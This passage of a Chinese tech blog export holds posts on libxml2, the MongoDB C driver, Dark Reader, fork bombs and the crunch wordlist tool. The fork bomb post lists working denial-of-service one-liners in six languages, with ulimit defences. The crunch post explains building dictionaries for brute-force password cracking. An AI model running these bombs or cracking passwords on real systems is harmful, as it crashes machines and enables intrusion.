标识是否存在子节点，对于存在子节点的节点，就进行递归。然后显示了节点的属性，通过 xmlHasProp 判断是否存在指定名字的属性，存在用 xmlGetProp 获取其值。注意，我获取了 一个属性对象（链表） xmlAttr* xmlAttr1=xmlNodePtr1-&gt;properties 之后进行遍历。在libxml2中，xmlNode、xmlDoc、xmlAttr 都是一个链表。之后进入递归，depth 只是表示深度，用于格式化输出if(ishas_child){ depth+=10; ParserXML(depth,xmlNodePtr1);}在进入的每个递归函数执行结束之前减去刚才进入的深度if(depth&gt;0){ depth-=10;} 接下来就是生成XML文档。。。 生成XML文档生成就简单一些了，下面是一个例子 123456789101112131415161718192021222324252627282930313233343536#include &lt;iostream&gt;#include &lt;libxml/parser.h&gt;#include &lt;libxml/tree.h&gt;using namespace std;void GenerateXML(const char *filename)&#123; xmlDocPtr xmlDocPtr1= xmlNewDoc(BAD_CAST XML_DEFAULT_VERSION); if(!xmlDocPtr1)&#123; cout&lt;&lt;"ERROR: "&lt;&lt;xmlGetLastError()-&gt;message&lt;&lt;endl; &#125; // 创建根节点 xmlNodePtr xmlRootPtr=xmlNewNode(NULL,BAD_CAST"Root"); xmlDocSetRootElement(xmlDocPtr1,xmlRootPtr); // 创建一个文本子节点，父节点为 xmlRootPtr xmlNodePtr xmlNodePtr1= xmlNewTextChild(xmlRootPtr,NULL,BAD_CAST"Management",BAD_CAST"None"); // 添加一个节点，父节点为 xmlNodePtr1 xmlNewTextChild(xmlNodePtr1,NULL,BAD_CAST"Score",BAD_CAST"None"); // 创建一个新的节点 xmlNodePtr xmlAnimalPtr= xmlNewNode(NULL,BAD_CAST"Animals"); xmlAddChild(xmlRootPtr,xmlAnimalPtr); // 创建元素 xmlAttrPtr xmlAttrPtr1= xmlNewProp(xmlAnimalPtr,BAD_CAST"Number",BAD_CAST"888"); xmlSetProp(xmlAnimalPtr,BAD_CAST"Number",BAD_CAST"9999");// xmlNodeSetName(xmlAnimalPtr,BAD_CAST"The_Animal");// xmlRemoveProp(xmlAttrPtr1); // 保存文件 if(xmlSaveFileEnc(filename,xmlDocPtr1,"UTF-8"))&#123; cout&lt;&lt;"生成 XML 文件成功！"&lt;&lt;endl; &#125; // 释放内存 xmlFreeDoc(xmlDocPtr1);&#125;int main()&#123; GenerateXML("test.xml");&#125; 这里通用的做法为 xmlNewDoc 创建一个新的XML文档并返回一个 xmlDocPtr ，创建一个根节点就是创建一个 xmlNodePtr 并通过 xmlDocSetRootElement 设置 xmlDocPtr 的根节点为 xmlNodePtr 。之后在继续添加子节点时，只需在 xmlNodePtr 的基础上创建新节点并添加即可。 xmlNewTextChild 函数用于文件一个文本子节点。如 &lt;node&gt;Hello&lt;/node&gt; 创建新节点的方法为 xmlNewNode 它返回一个 xmlNodePtr ，之后 xmlAddChild 把一个节点添加到父节点上。 通过 xmlNewProp 创建一个属性 xmlAttrPtr ，之后可通过xmlSetProp或xmlNodeSetName 设置属性的值。删除属性 xmlRemoveProp 最后，全部OK了， xmlSaveFileEnc 来保存XML文档 编译运行生成test.xml，可能格式有点混乱，我修改了一下 1234567&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;Root&gt; &lt;Management&gt;None &lt;Score&gt;None&lt;/Score&gt; &lt;/Management&gt; &lt;Animals Number="9999"/&gt;&lt;/Root&gt; OK，基本上解析XML也不算太难。除了libxml2库外，还有其他的库也可以解析XML。看个人爱好了 :) bye~]]></content>
      <categories>
        <category>Programming</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[C++ 调用MongoDB C Driver]]></title>
    <url>%2Fcpp-call-mongodb-c-driver%2F</url>
    <content type="text"><![CDATA[嗯……环境都准备好了，那么现在可以开始用我们敬爱的C++通过接口来间接操控MongoDB数据库。注意，要有一定的MongoDB数据库基础知识哦～ 启动MongoDB服务器首先要做的，就是启动服务器 mongod –config ${MONGODB}/conf.d/mongo.conf 要停止服务器，不建议直接kill掉，而是加上一个 –shutdown 参数 我们还要创建一个可读写指定数据库的用户，比如 use admindb.createUser({user:’user_test’,pwd:’12345’,roles:[{role:’readWrite’,db:’db_test’}]} 这里创建了用户 user_test，密码 12345，只能读写数据库 db_test mongoc我们只需引用头文件 libmongoc-1.0/mongoc.h在 main 函数要调用 mongoc_init() 来初始化库以及结尾 mongoc_cleanup() 来释放 要连接到MongoDB数据库，就得提供一个连接字符串，类似于 mongodb://username:password@host:port/db例如： mongodb://localhost:27017表示连接到本地回环地址127.0.0.1，以及端口27017的服务器，这个连接方式无需验证身份(没有开启 auth)。然而，这个例子的连接字符串为： mongodb://user_test:12345@127.0.0.1:27017/db_test 有了连接字符串，那么我们怎么连接到服务器？可以通过 mongoc_client_get_database() 来建立一个client 1mongoc_client_t * mongoc_client_new (const char *uri_string); 该函数返回一个 mongoc_client_t* 结构指针，之后的操作就是通过该指针来访问 database、collection…… 除了直接通过一个连接字符串来建立client，还可以‘构造’一个 uri 建立client。这一步也很简单，可以调用 mongoc_uri* 系列函数，再 mongoc_client_new_from_uri()，如：mongoc_uri_t uri=mongoc_uri_new(“mongodb://127.0.0.1:27017”);mongoc_uri_set_database(uri,”xxxx”);mongoc_uri_set_username(uri,”xxxx”);mongoc_uri_set_password(uri,”xxxx”);mongoc_client_t client= mongoc_client_new_from_uri(uri); 连接成功后，可以通过来获取 mongoc_client_get_default_database 来获取默认的数据库（前提是刚才连接字符串提供了一个数据库），或者 mongoc_client_get_database 来获取指定名称的数据库 12mongoc_database_t * mongoc_client_get_database (mongoc_client_t *client, const char *name);mongoc_database_t * mongoc_client_get_default_database (mongoc_client_t *client); 通过 mongoc_database_has_collection() 判断是否存在一个 collection 123456bool mongoc_database_has_collection (mongoc_database_t *database,const char *name,bson_error_t *error);typedef struct _bson_error_t &#123; uint32_t domain; uint32_t code; char message[BSON_ERROR_BUFFER_SIZE];&#125; bson_error_t; 有了database，那么就可以获取某个collection，方法有两个 123mongoc_collection_t * mongoc_client_get_collection (mongoc_client_t *client,const char *db,const char *collection);mongoc_collection_t *mongoc_database_get_collection (mongoc_database_t *database, const char *name); 接下来，就是重头戏了 Creating BSON DocumentsBSON，类似与JSON，但又有点不同。通过创建BSON Document来实现与MongoDB的交互。如： 1234567891011&gt; db.test.insert(&#123;'name':'xiaoming','age':10,info:['shy','helpful']&#125;)&gt; db.test.find().pretty()&#123; "_id" : ObjectId("5a8e1dced077dc147db71f81"), "name" : "xiaoming", "age" : 10, "info" : [ "shy", "helpful" ]&#125; BSON文档就有点类似与 {‘name’:’xiaoming’,’age’:10,info:[‘shy’,’helpful’]} mongoc有几种方式创建BSON文档： appending key-value pairs, using BCON, or parsing JSON其中，最简单的就是BCON，不过再次之前先了解下使用 bson**，只需引用 bson.h 即可 bson123456789101112131415// 创建一个BSON文档bson_t *doc=bson_new();// 添加一个 UTF-8 字符串，-1 表示该字符串长度bson_append_utf8(doc,"name",-1,"xiaodong",-1);// 添加一个 int32 整数bson_append_int32(doc,"age",-1,10);BSON_APPEND_UTF8(doc,"name","xiaoqiang");BSON_APPEND_INT32(doc,"age",11);// 返回一个 JSON 字符串char *jsonstr= bson_as_canonical_extended_json(doc,NULL);printf(jsonstr)// 释放由 bson_as_canonical_extended_json 返回char *bson_free(jsonstr);// 释放 bson_new 分配的内存bson_destroy(doc); 结果{ “name” : “xiaodong”, “age” : { “$numberInt” : “10” }, “name” : “xiaoqiang”, “age” : { “$numberInt” : “11” } } 可通过 bson** 系列函数 或者 BSON**宏 来添加BSON文档通过 bson_t 获取 JSON 字符串，可以调用以下函数 123char * bson_as_canonical_extended_json(const bson_t *bson, size_t *length)char * bson_as_json(const bson_t *bson, size_t *length)char * bson_as_relaxed_extended_json(const bson_t *bson, size_t *length) 必须要有对应的 bson_free() 来释放该分配的内存；bson_destroy() 来释放一个BSON文档 BCON用 BCON_* 宏来操控BSON Document我认为更简单些，而且写法也更高级。 BSON C Object Notation, BCON for short, is an alternative way of constructing BSON documents in a manner closer to the intended format. It has less type-safety than BSON’s append functions but results in less code 123456789bson_t *bson=BCON_NEW( "name",BCON_UTF8("xiaoHong"), "age",BCON_INT32(15), "info", "[", "&#123;","country",BCON_UTF8("China"), "&#125;", "&#123;","phone",BCON_UTF8("110"), "&#125;", "]"); { “name” : “xiaoHong”, “age” : { “$numberInt” : “15” }, “info” : [ { “country” : “China” }, { “phone” : “110” } ] } 通过使用 BCON_* 函数更直观、方便简单的创建BSON文档。 Creating BSON from JSON上面介绍了创建一个BSON文档以及从BSON文档获取一个JSON字符串。那么，我们是否可以通过JSON字符串反向解析一个BSON文档呢？答案是肯定的。不过，这好像是对于单文档而言， 1bson_t * bson_new_from_json (const uint8_t *data, ssize_t len, bson_error_t *error); 123456const char *json = "&#123;\"name\":\"xiaoJun\",\"age\":15&#125;";bson_t *newbs= bson_new_from_json((const uint8_t*)json,-1,NULL);jsonstr=bson_as_canonical_extended_json(newbs,NULL);printf(json);bson_free(jsonstr);bson_destroy(newbs); 有了这些基础后，那么接下来就不会那么吃力了 遍历 collections在MongoDB交互shell中，我们可以直接通过 db.test.find().pretty() 来列出所有的数据。注意 find() 是可以提供参数的 12345678910111213141516171819202122232425&gt; db.test.findfunction (query, fields, limit, skip, batchSize, options) &#123; var cursor = new DBQuery(this._mongo, this._db, this, this._fullName, this._massageObject(query), fields, limit, skip, batchSize, options || this.getQueryOptions()); &#123; const session = this.getDB().getSession(); const readPreference = session._serverSession.client.getReadPreference(session); if (readPreference !== null) &#123; cursor.readPref(readPreference.mode, readPreference.tags); &#125; const readConcern = session._serverSession.client.getReadConcern(session); if (readConcern !== null) &#123; cursor.readConcern(readConcern.level); &#125; &#125; return cursor;&#125; mongoc提供了 mongoc_collection_find_with_opts 函数来获取一个 游标(Cursor) ，注意 mongoc_collection_find 被弃用了。 1mongoc_cursor_t * mongoc_collection_find_with_opts (mongoc_collection_t *collection,const bson_t *filter,const bson_t *opts,const mongoc_read_prefs_t *read_prefs) mongoc_collection_find_with_opts 要求4个参数，参数我们只关注前两个参数，其中 bson_t *filter 至关重要，类似于 MYSQL select from tb_xxx *where id = 5 12345678910111213// 空BSON文档 &#123;&#125;bson_t *bson=BCON_NEW(NULL);mongoc_cursor_t *cursor= mongoc_collection_find_with_opts(coll,bson,NULL,NULL);// 获取当前文档，注意是一个 const bson_t *，并传入 mongoc_cursor_next 第二个参数const bson_t *ps=mongoc_cursor_current(cursor);while (mongoc_cursor_next(cursor,&amp;ps))&#123; char *json=bson_as_canonical_extended_json(ps,&amp;size); printf(json); bson_free(json);&#125;// 释放 cursormongoc_cursor_destroy(cursor); bson_t bson=BCON_NEW(NULL); 等价于 db.test.find({}) 或者 db.test.find()当然，也可以这么来写bson_t bson=BCON_NEW(“age”,”{“,”$gt”,BCON_INT32(13),”}”);这就类似于 db.test.find({‘age’:{‘$gt’:13}}) 增删查改像大多数数据库一样，增删查改是必不可少的基本步骤。 insert12345678910111213141516171819MONGOC_EXPORT (bool)mongoc_collection_insert (mongoc_collection_t *collection, mongoc_insert_flags_t flags, const bson_t *document, const mongoc_write_concern_t *write_concern, bson_error_t *error);MONGOC_EXPORT (bool)mongoc_collection_insert_one (mongoc_collection_t *collection, const bson_t *document, const bson_t *opts, bson_t *reply, bson_error_t *error);MONGOC_EXPORT (bool)mongoc_collection_insert_many (mongoc_collection_t *collection, const bson_t **documents, size_t n_documents, const bson_t *opts, bson_t *reply, bson_error_t *error); 千万别被这么多参数给吓倒了。这里我们只需关注 mongoc_collection_t collectionconst bson_t \documentbson_error_t *error(可选，表示错误信息) 下面是一个简单的例子，省略了大部分代码 123456789101112131415bson_t *bson=BCON_NEW( "name",BCON_UTF8("xiaoDong"), "age",BCON_INT32(18), "info", "[", "&#123;","country",BCON_UTF8("China"), "&#125;", "&#123;","phone",BCON_UTF8("150"), "&#125;", "]" );// 插入数据retr=mongoc_collection_insert_one(coll,,NULL,NULL,&amp;error);if(!retr)&#123; printf(error.message);&#125;bson_destroy(bson); delete123456789101112MONGOC_EXPORT (bool)mongoc_collection_delete_one (mongoc_collection_t *collection, const bson_t *selector, const bson_t *opts, bson_t *reply, bson_error_t *error);MONGOC_EXPORT (bool)mongoc_collection_delete_many (mongoc_collection_t *collection, const bson_t *selector, const bson_t *opts, bson_t *reply, bson_error_t *error); mongoc_collection_delete 已被弃用，这里没有列出这个类似Insert，例子就没有了哈 :) find这个前面就是前面的 遍历collections …… update123456789101112131415161718192021MONGOC_EXPORT (bool)mongoc_collection_update (mongoc_collection_t *collection, mongoc_update_flags_t flags, const bson_t *selector, const bson_t *update, const mongoc_write_concern_t *write_concern, bson_error_t *error);MONGOC_EXPORT (bool)mongoc_collection_update_one (mongoc_collection_t *collection, const bson_t *selector, const bson_t *update, const bson_t *opts, bson_t *reply, bson_error_t *error);MONGOC_EXPORT (bool)mongoc_collection_update_many (mongoc_collection_t *collection, const bson_t *selector, const bson_t *update, const bson_t *opts, bson_t *reply, bson_error_t *error); 注意那个 mongoc_update_flags_t，这个经常用到。 12345typedef enum &#123; MONGOC_UPDATE_NONE = 0, MONGOC_UPDATE_UPSERT = 1 &lt;&lt; 0, MONGOC_UPDATE_MULTI_UPDATE = 1 &lt;&lt; 1,&#125; mongoc_update_flags_t; 现在就 mongoc_collection_update 这个函数为例，除了那个 const mongoc_write_concern_t *write_concern 参数以外，其他的似乎都挺常用。。。不过再次之前，先来看看Mongo下update数据。 当前 db_test 存在如下数据 12345db.test.find()&#123; &quot;_id&quot; : ObjectId(&quot;5a8e30c0d077dc147db71f83&quot;), &quot;name&quot; : &quot;xiaolong&quot;, &quot;age&quot; : 14 &#125;&#123; &quot;_id&quot; : ObjectId(&quot;5a8e3102d077dc147db71f84&quot;), &quot;name&quot; : &quot;xiaoqiang&quot;, &quot;age&quot; : 10 &#125;&#123; &quot;_id&quot; : ObjectId(&quot;5a8e3108d077dc147db71f85&quot;), &quot;name&quot; : &quot;xiaofeng&quot;, &quot;age&quot; : 12 &#125;&#123; &quot;_id&quot; : ObjectId(&quot;5a8e38ba53d6700f027556c2&quot;), &quot;name&quot; : &quot;xiaoHong&quot;, &quot;age&quot; : 15, &quot;info&quot; : [ &#123; &quot;country&quot; : &quot;China&quot; &#125;, &#123; &quot;phone&quot; : &quot;110&quot; 我要查看 age 大或等于 12 的记录，那么我可以这样做 1234db.test.find(&#123;&apos;age&apos;:&#123;&apos;$gte&apos;:12&#125;&#125;)&gt;&#123; &quot;_id&quot; : ObjectId(&quot;5a8e30c0d077dc147db71f83&quot;), &quot;name&quot; : &quot;xiaolong&quot;, &quot;age&quot; : 14 &#125;&quot;xiaofeng&quot;, &quot;age&quot; : 12 &#125;&#123; &quot;_id&quot; : ObjectId(&quot;5a8e38ba53d6700f027556c2&quot;), &quot;name&quot; : &quot;xiaoHong&quot;, &quot;age&quot; : 15, &quot;info&quot; : [ &#123; &quot;country&quot; : &quot;China&quot; &#125;, &#123; &quot;phone&quot; : &quot;110&quot; &#125; ] &#125; 要修改 age 大或等于 12 的 name 的所有记录，那么我么可以这样做db.test.update({‘age’:{‘$gte’:12}},{‘$set’:{‘name’:’XXXXX’}},false,true) 类似与MySQL：update tb_xxx set name=’xxxxx’ where age &gt;=12 这时候回过头来看看 123const bson_t *selector =&gt; &#123;&apos;age&apos;:&#123;&apos;$gte&apos;:12&#125; &#125;const bson_t *update =&gt; &#123;&apos;$set&apos;:&#123;&apos;name&apos;:&apos;XXXXX&apos;&#125;&#125;mongoc_update_flags_t flags =&gt; MONGOC_UPDATE_MULTI_UPDATE 于是可以这样写 123456789101112bson_t *query=BCON_NEW("age","&#123;", "$gte",BCON_INT32(12), "&#125;");bson_t *update=BCON_NEW("$set","&#123;", "age",BCON_INT32(888), "&#125;");bool retr= mongoc_collection_update(coll,MONGOC_UPDATE_MULTI_UPDATE,query,update,NULL,&amp;error);if(!retr)&#123; cout&lt;&lt;error.message&lt;&lt;endl;&#125;bson_destroy(query);bson_destroy(update); 注意，“age”,”{“ 要单独写，不能写成 “age{“，否则 src/bson/bcon.c:784 bcon_append_ctx_va(): precondition failed: type == BCON_TYPE_UTF8 这是最坑爹的地方 内存释放别以为这样就结束了哦，还要记得要释放所有的内存 123456789// 释放char*指针bson_free(void *mem);// 释放 bson_t *bson文档bson_destroy(bson_t *bson);mongoc_cursor_destroy(cursor);mongoc_collection_destroy(coll);mongoc_database_destroy(database);mongoc_client_destroy(client);mongoc_cleanup(); 编译编译方法也很简单 g++ main.cpp -o main pkg-config –libs –cflags libmongoc-1.0 或者 g++ main.cpp -o main -lbson-1.0 -lmongoc-1.0 结尾不得不说，用mongoc来操控mongoDB数据库还挺复杂的。因此建议自己把这些函数封装成类对象。其实，关于mongoc封装成类，Mongoc目前已经发展到了MongoCXX，以Mongoc为基础，所有操作都被封装到类里面。引入了几个特殊的对象 view、value、view_or_value。同时，构建(Build)一个BSON文档有两种方法：basic、stream。可 参阅这里 以后有空再介绍mongocxx吧～ 参考 http://mongoc.org/libmongoc/current/tutorial.html]]></content>
      <categories>
        <category>MongoDB</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>C</tag>
        <tag>Linux</tag>
        <tag>MongoDB</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Chrome浏览器网页变成黑色(Dark Reader)]]></title>
    <url>%2Fchrome-dark%2F</url>
    <content type="text"><![CDATA[Dark Reader 就是一个开源chrome浏览器的扩展程序，它可以让大部分网页在夜间和日间浏览。对于使用Chrome的用户来说，这是一个很好的护眼插件。目前Dark Reader支持的浏览器有Chrome，Firefox，Safari DuckduckGo和Dark Reader总所周知，DuckduckGo是一个保护用户隐私的搜索引擎，但它有一个好处是能够设置页面的主题 通过Dark Reader插件后的chrome浏览器 获取Dark Reader 1. chrome网上应用店 2. Github 安装方式对于第一种安装方式，这里不在多说，很简单。这里介绍下第二种安装方法。 1234git clone https://github.com/darkreader/darkreader.gitcd darkreadernpm installnpm run release 这是就会在当前目录下生成 build.zip，build-firefox.xpi，build文件夹。 其中 build-firefox.xpi 用于Firefox，而build则用于chrome，可能有人会问，chrome的插件后缀不是 .crx 吗？ 不急，我们打开chrome-&gt;扩展程序，开启【开发者模式】后，【加载已解压的扩展程序…】后找到那个 build文件夹 后发现插件加载成功！ 使用功能如下 通过网站列表过滤设置黑暗/明亮主题 亮度，对比度，棕褐色滤镜，灰度 字体，文字描边 结尾总之，Dark Reader是一个非常有实用价值的开源chrome插件。但是Android Chrome没有安装插件这一功能，不过可以通过 chrome://flags 来设置chrome主题！ bye~]]></content>
      <categories>
        <category>Others</category>
      </categories>
      <tags>
        <tag>Chrome</tag>
        <tag>Google</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Fork bomb命令]]></title>
    <url>%2Ffork-bomb-commands%2F</url>
    <content type="text"><![CDATA[Fork bomb 是一种拒绝服务攻击，无限 fork 子进程以耗尽可用系统资源(CPU占用率高达100%)，由于资源匮乏而导致系统速度放慢或崩溃。 Linux Bash一个最简单的例子 (请在虚拟机上执行！) 1$ :()&#123; :|:&amp; &#125;;: :() 定义一个名为 : 的函数 { … } 函数体 :|: 递归调用该命令 &amp; 后台运行，前台运行直接为 ; ; 分割符 : 执行名为 : 的函数 执行该命令会创建一个子进程，然后在无限循环中重复自己，不断产生进程，结果是一个无法响应的系统(死机)。 Windows BatchWindows 批处理同样也可以发生fork bomb。新建一个.bat批处理文件，并添加一下简短的内容 1%0 | %0 Python123import oswhile True: os.fork() Java12345678910public class ForkBomb&#123; public static void main(String[] args) &#123; while(true) &#123; Runtime.getRuntime().exec(new String[]&#123;"javaw", "-cp", System.getProperty("java.class.path"), "ForkBomb"&#125;); &#125; &#125;&#125; C123456#include &lt;unistd.h&gt;int main()&#123; while(1) &#123; fork(); &#125;&#125; PowerShell123while($true) &#123; Start-Process powershell.exe -ArgumentList "-NoExit", "Get-ChildItem -Recurse C:"; Invoke-Expression -Command 'while($true) &#123;Start-Process powershell.exe -ArgumentList "-NoExit", "Get-ChildItem -Recurse C:"&#125;';&#125; 避免在Linux下，可以通过 ulimit 设置的最大进程数(max user processes) 1234567891011121314151617$ ulimit -acore file size (blocks, -c) 0data seg size (kbytes, -d) unlimitedscheduling priority (-e) 0file size (blocks, -f) unlimitedpending signals (-i) 30195max locked memory (kbytes, -l) 16384max memory size (kbytes, -m) unlimitedopen files (-n) 1024pipe size (512 bytes, -p) 8POSIX message queues (bytes, -q) 819200real-time priority (-r) 0stack size (kbytes, -s) 8192cpu time (seconds, -t) unlimitedmax user processes (-u) 30195virtual memory (kbytes, -v) unlimitedfile locks (-x) unlimited 但是这只能在当前终端生效。因此，还可以修改 /etc/security/limits.conf 配置文件 12#&lt;domain&gt; &lt;type&gt; &lt;item&gt; &lt;value&gt;* soft nproc 4096 结尾参考资料 https://www.incapsula.com/ddos/attack-glossary/fork-bomb.html https://en.wikipedia.org/wiki/Fork_bomb]]></content>
      <categories>
        <category>Others</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MongoDB C Driver安装]]></title>
    <url>%2Fmongodb-driver-install%2F</url>
    <content type="text"><![CDATA[这次就MongoDB来记录下安装C Driver过程。 Install MongoDB C Driver我百度了一下，有关用C/C++调用MongoDB提供的接口的教程，貌似很少，我也没怎么Google，索性就看官网提供的文档算了，反正大部分都是代码。。。 MongoDB C Driver支持的平台如下 Supported Platforms Archlinux Debian 8.1 macOS 10.10 Microsoft Windows Server 2008 RHEL 7.0, 7.1, 7.2 SUSE 12 Ubuntu 12.04, 14.04, 16.04 Clang 3.4, 3.5, 3.7, 3.8 GCC 4.6, 4.8, 4.9, 5.3 MinGW-W64 Visual Studio 2010, 2013, 2015 x86, x86_64, ARM (aarch64), Power8 (ppc64le), zSeries (s390x) 从包管理工具安装对于Debian或Ubuntu，可以直接从以下命令安装 apt-get install libmongoc-1.0-0 对于其他Linux系统，也是大同小异的。然而，我还是比较喜欢编译安装，感觉可控性更高些。 编译安装 OpenSSL is required for authentication or for SSL connections to MongoDB. Kerberos or LDAP support requires Cyrus SASL. 这一步我直接跳过。 注意 ，编译mongo-c-driver还需要 libbson 不过mongo-c-driver已经包含了该库源码 注意，–disable-automatic-init-and-cleanup 是官网推荐的参数，意思大概就是 禁止自动初始化和释放，这应该跟调用库有关，不过我没有加上 默认安装到 /usr/local 之后就可以 make + make install Building from git git clone https://github.com/mongodb/mongo-c-driver.git 这个方法我没怎么注意，有兴趣的可以自己尝试下 其他平台的构建除了Linux，常用的Mac OS，Windows的安装方法这里就不在赘述了 注意因为我是从源码编译安装的，在这过程中，也遇到了一些奇葩问题。configure默认prefix为 /usr/local，libmongoc-1.0，libbson-1.0头文件安装到/usr/local/include，以及相应的链接库在/usr/local/lib。这似乎没有什么错误。但是当我用编写代码时发现我引用头文件 #include 时看到它里面其实包含 #include 而经过 locate bson.h，结果发现只存在 /usr/local/include/libbson-1.0/bson.h。。。这就是问题了 于是我可以cp /usr/local/include/libbson-1.0 目录下所有文件到 /usr/include 结尾编译安装MongoDB C Driver算是简单了吧，与 MongoCXX 的安装方法相比，这的确算是简单了 :) 详细过程参阅 Installing the MongoDB C Driver bye~]]></content>
      <categories>
        <category>MongoDB</category>
      </categories>
      <tags>
        <tag>C</tag>
        <tag>Linux</tag>
        <tag>MongoDB</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[强大的Crunch字典生成工具]]></title>
    <url>%2Flinux-crunch%2F</url>
    <content type="text"><![CDATA[计算机里的字典这东西,说白了就是保存着大量的可知数据,一般是用来暴力破解的……而要想要爆破成功,就得有一个强大而又有用的字典.而Linux下的一个开源程序 crunch 就是为了对字典的生成而被创造出来的. crunch安装很简单:apt-get install crunchcrunch的使用方法建议 man crunch 查看帮助文档,并且其中也有一些例子. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697CRUNCH(1) General Commands Manual CRUNCH(1)NAME crunch - generate wordlists from a character setSYNOPSIS crunch &lt;min-len&gt; &lt;max-len&gt; [&lt;charset string&gt;] [options]DESCRIPTION Crunch can create a wordlist based on criteria you specify. The output from crunch can be sent to the screen, file, or to another program. The required parameters are: min-len The minimum length string you want crunch to start at. This option is required even for parameters that won&apos;t use the value. max-len The maximum length string you want crunch to end at. This option is required even for parameters that won&apos;t use the value. charset string You may specify character sets for crunch to use on the command line or if you leave it blank crunch will use the default character sets. The order MUST BE lower case characters, upper case characters, numbers, and then symbols. If you don&apos;t follow this order you will not get the results you want. You MUST specify either values for the character type or a plus sign. NOTE: If you want to include the space character in your character set you must escape it using the \ character or enclose your character set in quotes i.e. &quot;abc &quot;. See the examples 3, 11, 12, and 13 for examples.OPTIONS -b number[type] Specifies the size of the output file, only works if -o START is used, i.e.: 60MB The output files will be in the format of starting letter-end‐ ing letter for example: ./crunch 4 5 -b 20mib -o START will generate 4 files: aaaa-gvfed.txt, gvfee-ombqy.txt, ombqz-wcydt.txt, wcydu-zzzzz.txt valid values for type are kb, mb, gb, kib, mib, and gib. The first three types are based on 1000 while the last three types are based on 1024. NOTE There is no space between the number and type. For example 500mb is cor‐ rect 500 mb is NOT correct. -c number Specifies the number of lines to write to output file, only works if -o START is used, i.e.: 60 The output files will be in the format of starting letter-ending letter for example: ./crunch 1 1 -f /pentest/pass‐ word/crunch/charset.lst mixalpha-numeric-all-space -o START -c 60 will result in 2 files: a-7.txt and 8-\ .txt The reason for the slash in the second filename is the ending character is space and ls has to escape it to print it. Yes you will need to put in the \ when specifying the filename because the last character is a space. -d numbersymbol Limits the number of duplicate characters. -d 2@ limits the lower case alphabet to output like aab and aac. aaa would not be generated as that is 3 consecutive letters of a. The format is number then symbol where number is the maximum number of consecutive characters and symbol is the symbol of the the character set you want to limit i.e. @,%^ See examples 17-19. -e string Specifies when crunch should stop early -f /path/to/charset.lst charset-name Specifies a character set from the charset.lst -i Inverts the output so instead of aaa,aab,aac,aad, etc you get aaa,baa,caa,daa,aba,bba, etc -l When you use the -t option this option tells crunch which symbols should be treated as literals. This will allow you to use the placeholders as let‐ ters in the pattern. The -l option should be the same length as the -t option. See example 15. -m Merged with -p. Please use -p instead. -o wordlist.txt Specifies the file to write the output to, eg: wordlist.txt -p charset OR -p word1 word2 ... Tells crunch to generate words that don&apos;t have repeating characters. By default crunch will generate a wordlist size of #of_chars_in_charset ^ max_length. This option will instead generate #of_chars_in_charset!. The ! stands for factorial. For example say the charset is abc and max length is 4.. Crunch will by default generate 3^4 = 81 words. This option will instead generate 3! = 3x2x1 = 6 words (abc, acb, bac, bca, cab, cba). THIS MUST BE THE LAST OPTION! This option CANNOT be used with -s and it ignores min and max length however you must still specify two numbers. -q filename.txt Tells crunch to read filename.txt and permute what is read. This is like the -p option except it gets the input from filename.txt. -r Tells crunch to resume generate words from where it left off. -r only works if you use -o. You must use the same command as the original command used to generate the words. The only exception to this is the -s option. If your original command used the -s option you MUST remove it before you resume the session. Just add -r to the end of the original command. -s startblock Specifies a starting string, eg: 03god22fs -t @,%^ Specifies a pattern, eg: @@god@@@@ where the only the @&apos;s, ,&apos;s, %&apos;s, and ^&apos;s will change. @ will insert lower case characters , will insert upper case characters % will insert numbers ^ will insert symbols -u The -u option disables the printpercentage thread. This should be the last option. -z gzip, bzip2, lzma, and 7z Compresses the output from the -o option. Valid parameters are gzip, bzip2, lzma, and 7z. gzip is the fastest but the compression is minimal. bzip2 is a little slower than gzip but has better compression. 7z is slowest but has the best compression. 命令格式为: crunch &lt;min-len&gt; &lt;max-len&gt; [&lt;charset string&gt;] [options] min-len: 生成字典的最小长度 max-len: 生成字典的最大长度 其中,几个比较重要的参数: 参数 描述 -b 指定写入文件最大字节数,类型可为kb, mb, gb, kib, mib, and gib.注意此参数必须跟 -o START 一起使用 -c 指定写出文件的行数 -s 指定crunch从该字符串开始生成字典 -e 指定crunch从该字符串结束生成字典 -f 指定一个字符集合,默认路径 /usr/share/crunch/charset.lst,作用见下文 -l 类似于转义的操作 -o 指定写出文件名,要分清楚 -o START -t 指定生成字典的特殊格式,此参数乃crunch的核心! -z 指定压缩生成的字典文件,格式为:gzip, bzip2, lzma, and 7z,且与 -o START 使用 -p 这个参数可以理解为把指定的字符串看做一个整体并自由组合 注意:在使用crunch生成字典时,一定要看生成的字典文件的预计大小.比如:[ crunch 1 8 ] 就是输出 1812GB 的数据!! 这样的话硬盘早就撑爆了!! example1 $ crunch 1 8这将会显示出从 a 到 zzzzzzzz 的数据,也就是1812GB! example2 $ crunch 1 6 abcdefg -o mydict.lst这将会生成一个从 a 到 gggggg 的字典文件 example3 $ crunch 8 8 -f /usr/share/crunch/charset.lst mixalpha-numeric-all-space这将生成 8位 大小写以及特殊符号的字典 charset.lst文件如下: 可以看到 mixalpha-numeric-all-space 表示 a-z,A-Z大小写+0-9数字+特殊字符:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ012345 6789!@#$%^&amp;*()-_+=~`[]{}|:;”‘&lt;&gt;,.?/ 当指定 -f 参数时,必须要指明一个变量,如 mixalpha-numeric-all-space example4 $ crunch 6 6 -s xxdog5 -t @@dog%注意这里的格式,这里以 xxdog5 开始且字符个数必须为6,因为这里最小字符数为6,同时 -t 指定的该格式也必须时 -s 指定的格式. 一般地,crunch的4个通配符代表了不同的意思 @ :表示一个 a-z 小写字符 , :表示一个 A-Z 大写字符 % :表示一个 0-9 的数字 ^ :表示一个象征符号 弄清楚这几个后,上面的也就可以明白了,如果把 xxdog5 换成 xxdoga 就错了 example5 $ crunch 3 3 -p abc这里指定了 -p 参数,意味着吧 a,b,c 这三个字符进行组合 .输出结果为:abcacbbacbcacabcba 当然这里也可以写成 crunch 3 3 -p a b c举一反三,再来一个例子: $ crunch 3 3 